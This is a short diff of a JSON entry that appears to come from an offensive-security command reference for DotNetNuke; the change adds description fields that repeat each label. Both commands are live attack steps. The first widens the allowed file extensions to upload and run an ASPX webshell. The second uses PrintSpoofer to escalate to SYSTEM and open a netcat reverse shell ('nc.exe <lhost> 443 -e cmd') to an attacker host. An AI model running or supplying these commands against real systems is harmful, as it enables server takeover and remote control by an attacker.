@@ -37,11 +37,13 @@
   "variations": [
     {
       "label": "RCE path 2 - widen Allowable File Extensions, upload ASPX webshell",
-      "command": "# Settings > Security > More > More Security Settings -> add asp,aspx to Allowable File Extensions -> Save\n# then http://<ip>/admin/file-management -> upload webshell.asp -> right-click > Get URL -> browse to run commands"
+      "command": "# Settings > Security > More > More Security Settings -> add asp,aspx to Allowable File Extensions -> Save\n# then http://<ip>/admin/file-management -> upload webshell.asp -> right-click > Get URL -> browse to run commands",
+      "description": "RCE path 2 - widen Allowable File Extensions, upload ASPX webshell. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Escalate to SYSTEM via SeImpersonate (files land in Portals\\0)",
-      "command": "c:\\DotNetNuke\\Portals\\0\\PrintSpoofer64.exe -c \"c:\\DotNetNuke\\Portals\\0\\nc.exe <lhost> 443 -e cmd\""
+      "command": "c:\\DotNetNuke\\Portals\\0\\PrintSpoofer64.exe -c \"c:\\DotNetNuke\\Portals\\0\\nc.exe <lhost> 443 -e cmd\"",
+      "description": "Escalate to SYSTEM via SeImpersonate (files land in Portals\\0). See the command syntax for exact parameters and flags."
     }
   ],
   "examples": [
